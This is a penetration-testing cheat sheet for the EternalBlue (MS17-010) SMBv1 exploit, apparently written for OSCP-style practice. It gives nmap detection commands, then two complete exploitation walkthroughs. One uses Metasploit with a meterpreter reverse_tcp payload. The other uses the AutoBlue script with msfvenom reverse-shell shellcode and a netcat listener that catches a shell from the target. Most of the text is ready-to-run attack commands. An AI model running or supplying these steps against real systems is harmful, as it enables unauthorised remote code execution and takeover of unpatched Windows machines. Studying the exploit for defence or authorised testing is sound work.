# MS17-010 — EternalBlue (CVE-2017-0144)

NSA-developed exploit leaked in 2017 (used by WannaCry/NotPetya). SMBv1
pre-auth Remote Code Execution over port 445. Affects unpatched Windows XP →
Server 2016 (commonly Windows 7 / Server 2008 R2). All addresses are placeholders.

## Detection

```bash
sudo nmap -sV -p 445 -O <TARGET_IP>
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 <TARGET_IP>
```

## Method 1 — Metasploit

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
run
```

## Method 2 — AutoBlue (no Metasploit)

Useful where MSF is restricted (e.g. OSCP).

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh          # prompts LHOST + LPORT → msfvenom-generated shellcode

nc -nvlp 1234            # 1. start the listener FIRST
cd ..
python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin   # 2. exploit
```

### Why `nc -nvlp 1234`?

`shell_prep.sh` builds a **reverse shell** shellcode (msfvenom, `LPORT=1234`). When
it runs on the target it connects **back** to you on 1234. `nc -nvlp 1234` is the
listener/handler that catches that connection = your shell. It's the manual
equivalent of MSF's `exploit/multi/handler`. Flags: `-n` no DNS, `-v` verbose,
`-l` listen, `-p` port (must equal the shellcode LPORT). Order matters:
**listener first, then exploit.**

## Notes

- The `smb-vuln-ms17-010` NSE script alone tells you if the host is vulnerable.
- Patch shipped March 2017 — any unpatched host after that is a misconfiguration.
- EternalBlue = SMB/445; the related BlueKeep = RDP/3389.
